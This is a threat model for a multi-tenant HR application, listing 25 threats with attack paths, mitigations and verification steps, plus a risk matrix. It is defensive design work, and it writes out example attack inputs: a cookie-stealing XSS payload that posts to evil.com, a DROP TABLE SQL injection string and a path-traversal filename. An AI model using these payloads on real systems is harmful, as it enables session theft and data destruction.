# Threat Model

This document identifies and analyses 20 security threats to HR Daddy, covering multi-tenant isolation, authentication, authorization, data protection, and application security. Each threat includes the asset at risk, attack path, risk assessment, mitigation strategy, and verification method.

---

## Threat Assessment Scale

**Likelihood:** Low | Medium | High
**Impact:** Low | Medium | High | Critical

---

## THREAT-001: Cross-Tenant Data Exposure

| Attribute | Detail |
|-----------|--------|
| **Asset** | All organisation-owned data (employees, payroll, documents, leave, attendance) |
| **Threat** | A user in Organisation A accesses data belonging to Organisation B |
| **Attack Path** | 1. Attacker enumerates resource IDs (sequential or guessable). 2. Attacker modifies URL or API request to include another org's resource ID. 3. If queries are not tenant-scoped, data from another org is returned. |
| **Likelihood** | Medium — requires knowledge of ID format but no elevated privileges |
| **Impact** | Critical — complete breach of tenant boundary exposes all data in target org |
| **Mitigation** | 1. All queries scoped by `organisationId` from session (never from request). 2. Repository base class enforces scoping. 3. Cross-tenant requests return 404. 4. File storage paths prefixed with org ID. 5. Cache keys prefixed with org ID. 6. Database `organisationId` column is NOT NULL on all tenant tables. |
| **Verification** | 1. Automated tests attempt cross-org resource access → 404. 2. Code review confirms all repositories extend TenantScopedRepository. 3. Database schema audit confirms NOT NULL constraint. 4. Penetration test with two test orgs. |

---

## THREAT-002: Insecure Direct Object Reference (IDOR)

| Attribute | Detail |
|-----------|--------|
| **Asset** | Employee records, documents, leave requests, payslips — any resource addressable by ID |
| **Threat** | A user accesses or modifies a resource they are not authorized to view by manipulating the resource ID in the request |
| **Attack Path** | 1. User observes their own resource ID (e.g., `/employees/emp_001`). 2. User increments or guesses another ID (e.g., `/employees/emp_002`). 3. If only authentication is checked (not authorization), the resource is returned. |
| **Likelihood** | High — trivial to attempt, especially with sequential IDs |
| **Impact** | High — unauthorized access to sensitive employee data, payroll, or documents |
| **Mitigation** | 1. Use UUIDs (not sequential integers) for all resource IDs. 2. Every resource access checks both tenant scope AND user permission/scope. 3. Manager can only access direct reports. 4. Employee can only access own records. 5. Permission service validates scope before data is returned. |
| **Verification** | 1. Employee requests another employee's profile → 403/404. 2. Manager requests non-report's data → 404. 3. Automated tests for every endpoint with wrong-user credentials. 4. IDs are UUIDs in schema. |

---


## THREAT-003: Privilege Escalation

| Attribute | Detail |
|-----------|--------|
| **Asset** | Role-based access control system, administrative functions |
| **Threat** | A user with Employee or Manager role gains Owner or HR Administrator privileges |
| **Attack Path** | 1. Attacker intercepts a role-change API call and replays it with their own user ID as target. 2. Attacker manipulates membership record via mass assignment. 3. Attacker exploits a missing permission check on an admin-only endpoint. |
| **Likelihood** | Medium — requires understanding of API structure |
| **Impact** | Critical — full administrative access to org data, payroll, and settings |
| **Mitigation** | 1. Role changes require `org.members.role.change` permission (Owner only). 2. Server-side permission checks on every mutation endpoint. 3. Role field excluded from mass-assignable attributes. 4. Membership role changes create audit events. 5. No client-side-only permission enforcement. |
| **Verification** | 1. Employee calls role-change endpoint → 403. 2. Mass assignment test includes `role` field → ignored. 3. Audit log shows all role changes. 4. Code review of all admin endpoints confirms permission middleware. |

---

## THREAT-004: Session Theft

| Attribute | Detail |
|-----------|--------|
| **Asset** | User sessions, authentication tokens |
| **Threat** | An attacker steals a valid session token to impersonate a user |
| **Attack Path** | 1. XSS attack exfiltrates session cookie. 2. Man-in-the-middle intercepts session over HTTP. 3. Session ID in URL (referrer leakage). 4. Shared computer with persistent session. |
| **Likelihood** | Medium — requires XSS or network position |
| **Impact** | High — full access as the compromised user including admin actions |
| **Mitigation** | 1. Session cookies are HttpOnly (no JS access). 2. Cookies are Secure (HTTPS only). 3. SameSite=Lax or Strict. 4. Session IDs never in URLs. 5. Sessions expire after inactivity (configurable, default 24h). 6. Password change invalidates all sessions. 7. Explicit logout destroys session server-side. 8. CSP headers prevent inline script execution. |
| **Verification** | 1. Inspect Set-Cookie headers for HttpOnly, Secure, SameSite flags. 2. Attempt XSS to read document.cookie → undefined. 3. Session expiry test after inactivity. 4. Password change → old session returns 401. |

---

## THREAT-005: Weak Password Handling

| Attribute | Detail |
|-----------|--------|
| **Asset** | User credentials, account access |
| **Threat** | Weak passwords allow brute-force or credential-stuffing attacks |
| **Attack Path** | 1. User sets password "123456". 2. Attacker uses credential list from public breach. 3. Attacker brute-forces login endpoint. |
| **Likelihood** | High — weak passwords are common; credential stuffing is automated |
| **Impact** | High — account compromise leads to data access proportional to user's role |
| **Mitigation** | 1. Password minimum 8 chars with uppercase, lowercase, and number (BR-AUTH-007). 2. Passwords hashed with bcrypt (cost factor 12) or Argon2id. 3. Account lockout after 5 failed attempts for 15 minutes (BR-AUTH-004). 4. Rate limiting on login endpoint. 5. No password hints or security questions. 6. Encourage (V2: enforce) MFA. |
| **Verification** | 1. Attempt weak password at registration → rejected. 2. 5 failed logins → 6th locked out. 3. Database inspection confirms hashed passwords. 4. Rate limit test on login endpoint. |

---


## THREAT-006: Invitation Abuse

| Attribute | Detail |
|-----------|--------|
| **Asset** | Organisation membership, onboarding security |
| **Threat** | An attacker exploits invitation links to gain unauthorized access to an organisation |
| **Attack Path** | 1. Invitation link is intercepted (email forwarding, shared link). 2. Expired invitation is replayed. 3. Invitation link reused after acceptance. 4. Attacker brute-forces invitation tokens. |
| **Likelihood** | Medium — invitation links travel via email which may be compromised |
| **Impact** | High — unauthorized membership in an organisation with assigned role |
| **Mitigation** | 1. Invitation tokens are cryptographically random (256-bit). 2. Tokens are single-use (BR-AUTH-008). 3. Tokens expire after 7 days (BR-AUTH-003). 4. Accepted/expired tokens return clear error, not silent failure. 5. Token consumption is atomic (prevents race condition on reuse). 6. Invitation creation creates audit event. 7. Owners can revoke pending invitations. |
| **Verification** | 1. Accept invitation → reuse same link → error. 2. Wait 7 days → attempt acceptance → expired error. 3. Brute-force random tokens → statistically infeasible. 4. Audit log shows invitation events. |

---

## THREAT-007: File Upload Attacks

| Attribute | Detail |
|-----------|--------|
| **Asset** | Server integrity, storage system, other users viewing documents |
| **Threat** | Attacker uploads malicious files (malware, scripts, oversized files) disguised as valid documents |
| **Attack Path** | 1. Attacker renames `.exe` to `.pdf` and uploads. 2. Attacker uploads HTML/SVG with embedded JavaScript. 3. Attacker uploads extremely large file to exhaust storage. 4. Attacker uploads file with path traversal in filename (e.g., `../../etc/passwd`). |
| **Likelihood** | High — file uploads are a common attack surface |
| **Impact** | High — malware distribution, XSS via stored files, storage exhaustion, server compromise |
| **Mitigation** | 1. Validate file type by magic bytes, not just extension (BR-DOC-001). 2. Enforce 10MB size limit server-side (BR-DOC-002). 3. Sanitize filenames (strip path separators, special chars). 4. Store files in object storage (not filesystem). 5. Serve downloads with `Content-Disposition: attachment`. 6. Set `Content-Type` explicitly (never trust uploaded content-type). 7. SVG/HTML files served with `X-Content-Type-Options: nosniff`. 8. Generate unique storage filenames (UUID-based). |
| **Verification** | 1. Upload renamed .exe → rejected (magic byte mismatch). 2. Upload 15MB file → rejected. 3. Upload file with `../` in name → sanitized. 4. Download SVG → served as attachment, not rendered inline. 5. Storage paths use generated names, not user filenames. |

---

## THREAT-008: File URL Leakage

| Attribute | Detail |
|-----------|--------|
| **Asset** | Employee documents (contracts, IDs, medical records) |
| **Threat** | Document download URLs are guessable, shared, or persist beyond intended access |
| **Attack Path** | 1. Signed URL is shared via chat/email. 2. URL is cached in browser history or proxy logs. 3. URL pattern is predictable (sequential paths). 4. URL does not expire — permanent access. |
| **Likelihood** | Medium — URLs are commonly shared or logged |
| **Impact** | High — sensitive documents (ID scans, medical records, contracts) exposed |
| **Mitigation** | 1. All document access via short-lived signed URLs (5-minute expiry). 2. URLs generated server-side after permission check. 3. Storage paths use org-scoped non-guessable structure. 4. Signed URLs cannot be extended or refreshed without re-authentication. 5. Download events logged in audit trail. 6. No direct public access to storage bucket. |
| **Verification** | 1. Signed URL expires after 5 minutes → returns 403/expired. 2. Attempt to guess storage path → access denied. 3. Audit log records every download with user identity. 4. Storage bucket has no public access policy. |

---

## THREAT-009: Payroll Data Exposure

| Attribute | Detail |
|-----------|--------|
| **Asset** | Compensation data, salary, bank details, payslips |
| **Threat** | Unauthorized users (Managers, Employees viewing others) access payroll information |
| **Attack Path** | 1. Manager accesses team member's payslip via direct API call. 2. Employee modifies payslip ID in URL to view colleague's payslip. 3. Payroll data leaks through overly broad API responses. 4. Compensation fields included in employee profile API response without filtering. |
| **Likelihood** | Medium — payroll endpoints exist; curiosity-driven access attempts are common |
| **Impact** | Critical — salary information is among the most sensitive HR data |
| **Mitigation** | 1. Payroll endpoints restricted to Owner/HR Admin only (BR-PAY-003). 2. Payslip access restricted to own records only (employee scope). 3. Compensation fields require `employee.compensation.read` permission. 4. API responses filtered by role — compensation fields stripped for unauthorized roles. 5. Payroll access logged in audit. 6. Manager role explicitly excluded from compensation data. |
| **Verification** | 1. Manager calls payroll endpoint → 403. 2. Employee requests colleague's payslip → 404. 3. Employee profile API for Manager role → compensation fields absent. 4. Audit log shows all payroll access events. |

---


## THREAT-010: Audit Log Tampering

| Attribute | Detail |
|-----------|--------|
| **Asset** | Audit trail integrity, compliance records |
| **Threat** | An attacker (including a malicious admin) modifies or deletes audit logs to cover their tracks |
| **Attack Path** | 1. Compromised admin account calls DELETE/UPDATE on audit records. 2. SQL injection modifies audit table. 3. Direct database access bypasses application controls. 4. Application bug allows audit mutation through an unprotected endpoint. |
| **Likelihood** | Low — requires either privileged access or injection vulnerability |
| **Impact** | Critical — audit integrity is fundamental to compliance and incident investigation |
| **Mitigation** | 1. Audit table has no UPDATE/DELETE endpoints in the application (BR-AUDIT-001). 2. Database application user has INSERT + SELECT only on audit table (no UPDATE/DELETE grants). 3. No ORM model exposes update/delete methods for audit. 4. Parameterized queries prevent SQL injection. 5. Audit timestamps are server-assigned only (BR-DATA-005). 6. Consider append-only database features or write-once storage for audit. |
| **Verification** | 1. Attempt DELETE on audit table via application → no endpoint exists. 2. Database permission audit confirms no UPDATE/DELETE grant. 3. SQL injection tests on all inputs. 4. Audit record timestamp cannot be overridden via API. |

---

## THREAT-011: Mass Assignment

| Attribute | Detail |
|-----------|--------|
| **Asset** | Data integrity, role assignments, sensitive fields |
| **Threat** | Attacker submits extra fields in request body that the server blindly persists, modifying protected attributes |
| **Attack Path** | 1. Employee updates their profile and adds `role: "owner"` to the request body. 2. Leave request submission includes `status: "approved"`. 3. Employee creation includes `organisationId` pointing to another org. 4. Payroll record update includes `netPay` directly (bypassing calculation). |
| **Likelihood** | High — trivial to add extra fields to any API request |
| **Impact** | High — privilege escalation, data corruption, bypass of business rules |
| **Mitigation** | 1. All inputs validated through strict Zod schemas that whitelist allowed fields. 2. Protected fields (role, status, organisationId, calculations) never accepted from client input. 3. Server derives organisationId from session, status from state machines, calculations from business logic. 4. Schema validation rejects unknown fields (`strict()` mode). 5. Separate DTOs for create vs update (update schemas exclude immutable fields). |
| **Verification** | 1. Submit employee update with `role` field → field ignored, role unchanged. 2. Submit leave request with `status: "approved"` → status is "pending". 3. Submit request with extra `organisationId` → session org used. 4. Schema validation tests confirm unknown fields rejected. |

---

## THREAT-012: Injection Attacks (SQL, NoSQL, Command)

| Attribute | Detail |
|-----------|--------|
| **Asset** | Database, server operating system, data confidentiality and integrity |
| **Threat** | Attacker injects malicious code through user inputs that is executed by the database or system shell |
| **Attack Path** | 1. Attacker enters `'; DROP TABLE employee; --` in a search field. 2. Attacker uses UNION-based injection to extract data from other tables. 3. Attacker injects OS commands through unsanitized file processing. |
| **Likelihood** | Medium — ORMs reduce risk but raw queries and string interpolation remain vulnerable |
| **Impact** | Critical — complete database compromise, data exfiltration, server takeover |
| **Mitigation** | 1. Use ORM (Prisma/Drizzle) for all standard queries — parameterization is automatic. 2. Raw SQL (when necessary) uses parameterized queries (`$queryRaw` with template literals). 3. Never concatenate user input into SQL strings. 4. Input validation via Zod schemas with length limits and character restrictions. 5. Principle of least privilege for database user (no DDL permissions). 6. No shell command execution with user-supplied input. |
| **Verification** | 1. SQL injection payloads in all text inputs → no data leakage or errors. 2. Code review for string concatenation in queries → none found. 3. Database user privilege audit. 4. Automated DAST scan against all endpoints. |

---

## THREAT-013: Cross-Site Scripting (XSS)

| Attribute | Detail |
|-----------|--------|
| **Asset** | User sessions, displayed data integrity, other users' browsers |
| **Threat** | Attacker injects JavaScript that executes in other users' browsers when viewing HR data |
| **Attack Path** | 1. Attacker enters `<script>fetch('evil.com',{body:document.cookie})</script>` as an employee name. 2. HR admin views the employee directory — script executes in their browser. 3. Attacker stores XSS in a document description or leave request note. |
| **Likelihood** | Medium — React's default escaping helps but dangerouslySetInnerHTML and rich text bypass it |
| **Impact** | High — session theft, admin account compromise, data exfiltration |
| **Mitigation** | 1. React auto-escapes all rendered content by default. 2. Never use `dangerouslySetInnerHTML` with user-supplied content. 3. Content Security Policy (CSP) header blocks inline scripts. 4. HttpOnly cookies prevent session theft even if XSS succeeds. 5. Input sanitization for any rich-text fields (DOMPurify server-side). 6. Output encoding for all user-supplied data in non-React contexts (emails, PDFs). |
| **Verification** | 1. Store XSS payload in employee name → rendered as text, not executed. 2. CSP header present and blocks inline scripts. 3. Cookie inspection confirms HttpOnly flag. 4. Automated XSS scanner against forms. |

---

## THREAT-014: Cross-Site Request Forgery (CSRF)

| Attribute | Detail |
|-----------|--------|
| **Asset** | State-changing operations (leave approval, employee creation, role changes) |
| **Threat** | Attacker tricks an authenticated user into performing unintended actions via a malicious website |
| **Attack Path** | 1. HR admin visits a malicious page while logged into HR Daddy. 2. The page contains a hidden form that POSTs to HR Daddy's leave-approval endpoint. 3. The browser automatically attaches the session cookie. 4. The leave is approved without the admin's knowledge. |
| **Likelihood** | Medium — requires the victim to visit a malicious page while authenticated |
| **Impact** | High — unauthorized state changes (approvals, deletions, role changes) |
| **Mitigation** | 1. SameSite=Lax (or Strict) on session cookies. 2. CSRF tokens for all state-changing requests (if using traditional forms). 3. For API calls: require custom header (e.g., `X-Requested-With`) that cross-origin requests cannot set. 4. Verify Origin/Referer header on state-changing requests. 5. Next.js server actions include built-in CSRF protection. |
| **Verification** | 1. Cross-origin POST without CSRF token → rejected. 2. SameSite cookie attribute verified. 3. Attempt state change from different origin → blocked. 4. Server action CSRF protection confirmed in framework configuration. |

---


## THREAT-015: Rate Limit Abuse

| Attribute | Detail |
|-----------|--------|
| **Asset** | System availability, authentication endpoints, export functions |
| **Threat** | Attacker overwhelms endpoints with rapid requests to brute-force credentials, exhaust resources, or abuse expensive operations |
| **Attack Path** | 1. Automated credential stuffing against login endpoint (thousands of attempts/minute). 2. Repeated export requests generating large files. 3. Repeated leave submissions creating notification spam. 4. API scraping of employee directory. |
| **Likelihood** | High — automated tools make this trivial |
| **Impact** | Medium — service degradation, brute-force success, resource exhaustion |
| **Mitigation** | 1. Rate limiting on login endpoint (5 attempts per 15 minutes per account, BR-AUTH-004). 2. Global rate limit per IP (configurable, e.g., 100 requests/minute). 3. Export endpoints rate-limited (1 export per 5 minutes per user). 4. Registration endpoint rate-limited. 5. Invitation endpoint rate-limited (prevents spam invitations). 6. Use sliding window algorithm for fairness. 7. Return 429 Too Many Requests with Retry-After header. |
| **Verification** | 1. 6th login attempt within 15 minutes → 429. 2. Burst 200 requests → rate limit triggers. 3. Two export requests within 5 minutes → second returns 429. 4. Retry-After header present in 429 responses. |

---

## THREAT-016: Sensitive Information in Logs

| Attribute | Detail |
|-----------|--------|
| **Asset** | Passwords, tokens, personal data, compensation data |
| **Threat** | Application logs inadvertently contain sensitive information that is accessible to operations staff or leaked through log aggregation services |
| **Attack Path** | 1. Login endpoint logs full request body including password. 2. Error handler logs the full request context including authorization headers. 3. Debug logging in production outputs employee records with compensation data. 4. Stack traces include database query parameters with personal data. |
| **Likelihood** | High — logging sensitive data is a common developer mistake |
| **Impact** | High — credential exposure, PII leakage, compliance violation (GDPR, etc.) |
| **Mitigation** | 1. Structured logging with explicit field allowlists (never log full request bodies). 2. Password fields redacted at the logging layer. 3. Authorization headers and tokens redacted. 4. Sensitive model fields (compensation, national ID, bank details) excluded from log serialization. 5. Log level set to INFO in production (no DEBUG). 6. Error responses never include stack traces in production. 7. Log retention policy with automated rotation. |
| **Verification** | 1. Grep production logs for password patterns → none found. 2. Trigger error → response contains generic message, not stack trace. 3. Review logging configuration for debug mode → disabled in production. 4. Sensitive field serializer test → fields are redacted. |

---

## THREAT-017: Misconfigured Environment Variables

| Attribute | Detail |
|-----------|--------|
| **Asset** | Database credentials, API keys, encryption secrets, third-party service tokens |
| **Threat** | Environment variables are exposed through misconfiguration, source control, or error messages |
| **Attack Path** | 1. `.env` file committed to Git repository. 2. Environment variables exposed through a debug endpoint or error page. 3. Docker image contains hardcoded secrets. 4. Client-side bundle includes server-side env vars. 5. Environment variables logged during application startup. |
| **Likelihood** | Medium — common in development-to-production transitions |
| **Impact** | Critical — database compromise, third-party service abuse, complete system takeover |
| **Mitigation** | 1. `.env` files in `.gitignore` (never committed). 2. Separate `.env.example` with placeholder values. 3. Server-side env vars never prefixed with `NEXT_PUBLIC_` unless intentionally public. 4. Startup validation checks required env vars exist (fail fast, but don't log values). 5. No debug endpoints in production. 6. Docker builds use multi-stage (secrets not in final image). 7. Secret management service for production (not filesystem env files). |
| **Verification** | 1. `git log` search for `.env` files → never committed. 2. Client bundle inspection → no server secrets present. 3. Error page in production → no env vars shown. 4. Startup without required vars → clear error message without exposing other vars. |

---

## THREAT-018: Accidental Production Seed Data

| Attribute | Detail |
|-----------|--------|
| **Asset** | Production data integrity, authentication security |
| **Threat** | Development seed data (test accounts with known passwords, demo organisations) accidentally runs in production |
| **Attack Path** | 1. Seed script runs in production deployment pipeline. 2. Attacker knows demo credentials from source code (e.g., `admin@test.com / password123`). 3. Attacker logs in with seeded admin account and accesses real organisation data. |
| **Likelihood** | Medium — seed scripts exist for development; deployment misconfiguration is possible |
| **Impact** | Critical — known credentials provide immediate admin access to production system |
| **Mitigation** | 1. Seed scripts check `NODE_ENV` and refuse to run in production. 2. Seed credentials use obviously fake values never matching real accounts. 3. Separate seed command from migration command (never auto-seed on deploy). 4. Production deployment pipeline explicitly excludes seed step. 5. Seed data uses a distinct org name (e.g., "DEMO - Northstar Studios") that would be obvious if seen in production. 6. Health check or startup validation flags if known seed accounts exist in production. |
| **Verification** | 1. Run seed command with `NODE_ENV=production` → refuses to execute. 2. Deploy pipeline inspection → no seed step. 3. Production database check for known seed emails → none found. 4. Seed script source review → environment guard present. |

---

## THREAT-019: Broken Access Control in Exports

| Attribute | Detail |
|-----------|--------|
| **Asset** | Bulk employee data, attendance records, payroll data, audit logs |
| **Threat** | Export functionality bypasses normal access controls, allowing users to download data they cannot view in the UI |
| **Attack Path** | 1. Manager triggers attendance export → export includes employees outside their reporting chain. 2. HR admin exports payroll → export includes data from other organisations (missing tenant scope in export query). 3. Employee discovers export endpoint URL and calls it directly → no permission check on export. |
| **Likelihood** | Medium — exports are often implemented as separate code paths that miss scoping |
| **Impact** | High — bulk data exfiltration of sensitive information |
| **Mitigation** | 1. Export queries use the same tenant-scoped repositories as UI queries. 2. Export endpoints enforce the same permission + scope checks as read endpoints. 3. Manager exports are scoped to their direct reports only. 4. Export metadata header includes generator identity and scope. 5. Export events logged in audit trail. 6. Rate limiting on export endpoints. 7. Exports are generated server-side (not client-side CSV from full API response). |
| **Verification** | 1. Manager export → contains only direct reports. 2. Cross-tenant export test → only current org data. 3. Employee calls export endpoint → 403. 4. Audit log shows export events with scope details. 5. Export file header includes generator metadata. |

---

## THREAT-020: Background Job Tenant Confusion

| Attribute | Detail |
|-----------|--------|
| **Asset** | Multi-tenant data isolation during async processing |
| **Threat** | Background jobs process data from wrong organisation due to missing or incorrect tenant context |
| **Attack Path** | 1. Nightly job iterates all organisations but a bug causes org B's notification to reference org A's employee data. 2. Job retries after failure with stale/wrong org context. 3. Job processes a queue message where org context was not preserved. 4. Shared in-memory state between job executions leaks org context. |
| **Likelihood** | Medium — background jobs lack the natural request-scoping of HTTP handlers |
| **Impact** | High — data leakage between tenants, notifications sent to wrong users, incorrect calculations |
| **Mitigation** | 1. Every job message includes explicit `organisationId` (captured at dispatch time). 2. Jobs validate org is active before processing. 3. Jobs use per-org iteration (never cross-org queries). 4. Job handlers create fresh scoped context per execution (no shared state). 5. Job failures are per-org (one org's failure doesn't affect others). 6. Job logs include org context for traceability. 7. Integration tests verify job isolation between orgs. |
| **Verification** | 1. Dispatch job for org A → verify only org A data processed. 2. Multi-org nightly job test → each org processed independently. 3. Job failure in org A → org B unaffected. 4. Job logs inspection → org ID present in every log line. 5. Test: deliberate wrong org ID in job payload → job validates and skips. |

---

## THREAT-021: RLS Policies Without Explicit GRANTs (Found & Fixed)

| Attribute | Detail |
|-----------|--------|
| **Asset** | Multi-tenant data isolation via Postgres RLS |
| **Threat** | RLS policies were enabled on all tables but the `authenticated` role had no GRANT statements, causing all queries through `dbAs()` to fail with "permission denied for table" |
| **Attack Path** | 1. `dbAs()` switches session role to `authenticated`. 2. RLS policies are evaluated but the role has zero grants. 3. Every query fails — this is a denial-of-service to the entire application, not a data leak. |
| **Likelihood** | High — this was the default state before the explicit GRANT block was added in migration 00001 |
| **Impact** | Medium — fails closed (deny-all), not open. No data leaks, but the application is non-functional. |
| **Mitigation** | 1. Migration 00001 adds explicit `GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO authenticated`. 2. `ALTER DEFAULT PRIVILEGES` ensures future tables are automatically granted. 3. Audit log has UPDATE/DELETE revoked (append-only enforcement). |
| **Verification** | 1. Integration test: query through `dbAs()` succeeds for owned rows. 2. Integration test: UPDATE on `audit_logs` through `dbAs()` fails with permission denied. |
| **Status** | Fixed in `prisma/migrations/00001_rls_policies/migration.sql` |

---

## THREAT-022: organisation_memberships Self-Referencing Policy Recursion (Found & Fixed)

| Attribute | Detail |
|-----------|--------|
| **Asset** | RLS policy evaluation on the `organisation_memberships` table |
| **Threat** | A tenant_isolation policy on `organisation_memberships` that checks `org_id IN (SELECT org_id FROM organisation_memberships WHERE user_id = auth.uid())` creates infinite recursion — Postgres detects this and raises "infinite recursion detected in policy for relation" |
| **Attack Path** | 1. Any query touching `organisation_memberships` triggers the policy. 2. The policy SELECTs from the same table it guards. 3. That SELECT triggers the same policy again. 4. Postgres detects infinite recursion and aborts. |
| **Likelihood** | High — standard policy pattern doesn't work on self-referencing tables |
| **Impact** | Medium — fails closed (error, no data leak), but all org-membership queries break |
| **Mitigation** | 1. `user_org_ids()` function declared as `SECURITY DEFINER` — runs as the function owner (superuser), exempt from RLS. 2. Function performs the membership lookup without triggering the policy. 3. All policies reference `user_org_ids()` rather than directly querying `organisation_memberships`. 4. Function access restricted: `REVOKE ALL FROM public; GRANT EXECUTE TO authenticated`. |
| **Verification** | 1. Query `organisation_memberships` through `dbAs()` — returns own org's memberships without recursion error. 2. Verify function is SECURITY DEFINER in pg_proc. |
| **Status** | Fixed in `prisma/migrations/00001_rls_policies/migration.sql` |

---

## THREAT-023: camelCase/snake_case Column Mismatch in RLS Policies (Found & Fixed)

| Attribute | Detail |
|-----------|--------|
| **Asset** | Effectiveness of RLS policies |
| **Threat** | Prisma model fields use camelCase (`orgId`) but `@@map` maps them to snake_case Postgres columns (`org_id`). If RLS policies reference the wrong casing, the policy silently evaluates to false (no matching column → NULL → deny all), making the application non-functional rather than insecure — but a partial mismatch on a boolean-condition column could theoretically no-op a policy |
| **Attack Path** | 1. Policy written with `orgId` (camelCase). 2. Postgres has no column named `orgId` — the actual column is `org_id`. 3. Policy evaluates to NULL for every row → denies all. |
| **Likelihood** | High — Prisma generates camelCase by default; manual SQL must use the mapped names |
| **Impact** | Low-to-Medium — fails closed in practice. Worst case: a compound policy condition where one clause silently no-ops could widen access. |
| **Mitigation** | 1. All migration SQL explicitly uses snake_case column names matching `@@map` declarations. 2. Integration tests verify that `dbAs()` queries return expected rows (would fail if policies are silently denying). 3. PR review checklist item: verify RLS SQL uses Postgres column names, not Prisma field names. |
| **Verification** | 1. `SELECT * FROM information_schema.columns WHERE table_name = 'employees' AND column_name = 'org_id'` — confirms column exists. 2. Query through `dbAs()` returns correct rows for the tenant. |
| **Status** | Fixed — all policies use snake_case throughout |

---

## THREAT-024: activity-tab.tsx Privileged Audit Read via Client-Supplied Props (Found & Fixed)

| Attribute | Detail |
|-----------|--------|
| **Asset** | Audit log confidentiality |
| **Threat** | The `ActivityTab` component accepted `employeeId` and `orgSlug` as client-supplied props and passed them directly to `fetchEmployeeActivity()`. A malicious client could forge these props to read audit entries for any employee in any organisation. |
| **Attack Path** | 1. Attacker inspects the component's props interface. 2. Attacker crafts a request to `fetchEmployeeActivity` with a victim's `employeeId` and their `orgSlug`. 3. The server action returns audit log entries for the victim without verifying the caller's relationship to that data. |
| **Likelihood** | Medium — requires knowledge of the action's parameters and a valid session |
| **Impact** | High — audit logs contain sensitive operational history (who changed what, when) |
| **Mitigation** | 1. `fetchEmployeeActivity()` now calls `getOrgContext(orgSlug)` which validates the caller's membership in the org via session. 2. `requirePermission(org.id, 'audit.view')` enforces that only OWNER/HR_ADMIN roles can access audit data. 3. The query runs through `dbAs(userId, ...)` ensuring RLS scoping — even if the permission check were bypassed, the database would only return rows visible to the authenticated user's org. |
| **Verification** | 1. Call `fetchEmployeeActivity` with another org's slug → returns auth error. 2. Call as EMPLOYEE role → returns permission denied. 3. Call as HR_ADMIN for own org → returns correct audit entries. |
| **Status** | Fixed — server action now derives identity from session, not props |

---

## THREAT-025: Plaintext Database Password Exposure (Open Item)

| Attribute | Detail |
|-----------|--------|
| **Asset** | Database credentials |
| **Threat** | The database connection password was pasted in plaintext during an early development session and is visible in repository/session history. The credential has not been rotated. |
| **Attack Path** | 1. Attacker gains access to session history, terminal scrollback, or CI logs from the early session. 2. Attacker uses the credential to connect directly to the database, bypassing all application-layer and RLS protections (connects as the database owner role). |
| **Likelihood** | Low — requires access to developer workstation or CI history |
| **Impact** | Critical — full database access bypassing all isolation |
| **Mitigation** | 1. **Outstanding: rotate the database password.** This requires infrastructure access not available in this context. 2. Ensure `.env` and `.env.local` are in `.gitignore` (confirmed). 3. Use a secrets manager in production (not yet implemented). |
| **Verification** | 1. Confirm old credential no longer authenticates after rotation. 2. Verify `.env*` files are not committed. |
| **Status** | **OPEN — credential rotation required** |

---

## Risk Summary Matrix

| Threat ID | Threat | Likelihood | Impact | Risk Level |
|-----------|--------|-----------|--------|------------|
| THREAT-001 | Cross-Tenant Data Exposure | Medium | Critical | **Critical** |
| THREAT-002 | Insecure Direct Object Reference | High | High | **Critical** |
| THREAT-003 | Privilege Escalation | Medium | Critical | **Critical** |
| THREAT-004 | Session Theft | Medium | High | **High** |
| THREAT-005 | Weak Password Handling | High | High | **High** |
| THREAT-006 | Invitation Abuse | Medium | High | **High** |
| THREAT-007 | File Upload Attacks | High | High | **High** |
| THREAT-008 | File URL Leakage | Medium | High | **High** |
| THREAT-009 | Payroll Data Exposure | Medium | Critical | **Critical** |
| THREAT-010 | Audit Log Tampering | Low | Critical | **High** |
| THREAT-011 | Mass Assignment | High | High | **High** |
| THREAT-012 | Injection Attacks | Medium | Critical | **Critical** |
| THREAT-013 | Cross-Site Scripting | Medium | High | **High** |
| THREAT-014 | Cross-Site Request Forgery | Medium | High | **High** |
| THREAT-015 | Rate Limit Abuse | High | Medium | **Medium** |
| THREAT-016 | Sensitive Information in Logs | High | High | **High** |
| THREAT-017 | Misconfigured Environment Variables | Medium | Critical | **Critical** |
| THREAT-018 | Accidental Production Seed Data | Medium | Critical | **Critical** |
| THREAT-019 | Broken Access Control in Exports | Medium | High | **High** |
| THREAT-020 | Background Job Tenant Confusion | Medium | High | **High** |
| THREAT-021 | RLS Policies Without Explicit GRANTs | High | Medium | **High** |
| THREAT-022 | organisation_memberships Policy Recursion | High | Medium | **High** |
| THREAT-023 | camelCase/snake_case Column Mismatch | High | Low-Medium | **Medium** |
| THREAT-024 | activity-tab Privileged Audit Read | Medium | High | **High** |
| THREAT-025 | Plaintext Database Password Exposure | Low | Critical | **High** |

---

## Priority Remediation Order

Based on risk level and implementation dependency:

1. **Foundation (implement first):**
   - THREAT-001: Cross-Tenant — repository scoping pattern
   - THREAT-012: Injection — ORM usage, parameterized queries
   - THREAT-017: Env Vars — gitignore, validation, build configuration
   - THREAT-018: Seed Data — environment guards

2. **Authentication & Session (implement with auth module):**
   - THREAT-004: Session — cookie configuration
   - THREAT-005: Passwords — hashing, lockout
   - THREAT-006: Invitations — token security
   - THREAT-014: CSRF — SameSite cookies, framework protection

3. **Authorization (implement with permission service):**
   - THREAT-002: IDOR — scope checks, UUID IDs
   - THREAT-003: Privilege Escalation — permission middleware
   - THREAT-009: Payroll Exposure — role-based field filtering
   - THREAT-011: Mass Assignment — Zod strict schemas
   - THREAT-019: Export Access — scoped export queries

4. **Application Security (implement with features):**
   - THREAT-007: File Uploads — magic byte validation
   - THREAT-008: File URLs — signed URLs with expiry
   - THREAT-013: XSS — CSP headers, React escaping
   - THREAT-015: Rate Limiting — middleware configuration
   - THREAT-020: Background Jobs — explicit org context

5. **Operational Security (implement pre-production):**
   - THREAT-010: Audit Integrity — database permissions, append-only design
   - THREAT-016: Logging — structured logging, field redaction

---

## Verification Strategy

### Automated Testing

- Unit tests for each mitigation (permission checks, schema validation, scope filtering)
- Integration tests for cross-tenant isolation (two-org test fixtures)
- End-to-end tests for authentication flows (lockout, session management)
- Automated DAST scanning against staging environment

### Manual Review

- Code review checklist includes security items for each threat
- Pre-release security review of new endpoints
- Periodic penetration testing (quarterly for production)
- Database permission audit (monthly)

### Continuous Monitoring

- Audit log alerting for suspicious patterns (multiple 403s, cross-tenant attempts)
- Rate limit threshold monitoring
- Failed login attempt aggregation
- Environment variable change detection

---

## Change Log

| Date | Change | Author |
|------|--------|--------|
| Initial | Complete V1 threat model (20 threats) | HR Daddy Architecture |
